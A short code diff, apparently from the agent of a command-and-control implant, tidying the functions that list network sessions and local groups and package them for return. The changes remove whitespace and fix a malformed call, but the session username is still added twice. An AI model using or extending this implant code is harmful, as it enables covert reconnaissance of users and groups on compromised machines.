@@ -2115,10 +2115,8 @@ VOID CommandNet( PPARSER Parser )
                         if ( SessionInfo == NULL )
                             break;
 
-
-
-                        PackageAddBytes( Package,  SessionInfo[i].sesi10_username, StringLengthW( SessionInfo[i].sesi10_username ) * 2 );
-                        PackageAddBytes( Package,  SessionInfo[i].sesi10_username, StringLengthW( SessionInfo[i].sesi10_username ) * 2 );
+                        PackageAddBytes( Package, SessionInfo[i].sesi10_username, StringLengthW( SessionInfo[i].sesi10_username ) * 2 );
+                        PackageAddBytes( Package, SessionInfo[i].sesi10_username, StringLengthW( SessionInfo[i].sesi10_username ) * 2 );
                         PackageAddInt32( Package, SessionInfo[i].sesi10_time );
                         PackageAddInt32( Package, SessionInfo[i].sesi10_idle_time );
                     }
@@ -2236,12 +2234,8 @@ VOID CommandNet( PPARSER Parser )
                 {
                     for( DWORD i = 0; i < EntriesRead; i++ )
                     {
-            
-
-        
-
-                        PackageAddBytes( Package, GroupInfo[ i ].lgrpi1_name, StringLengthW( GroupInfo[ i ].lgrpi1_name ) * 2 );
-                        PackageAddBytes( Package, Desc, GroupInfo[ i ].lgrpi1_comment, StringLengthW( GroupInfo[ i ].lgrpi1_comment ) * 2 );
+                        PackageAddBytes( Package, GroupInfo[ i ].lgrpi1_name,    StringLengthW( GroupInfo[ i ].lgrpi1_name ) * 2 );
+                        PackageAddBytes( Package, GroupInfo[ i ].lgrpi1_comment, StringLengthW( GroupInfo[ i ].lgrpi1_comment ) * 2 );
                     }
 
                     Instance.Win32.NetApiBufferFree( GroupInfo );
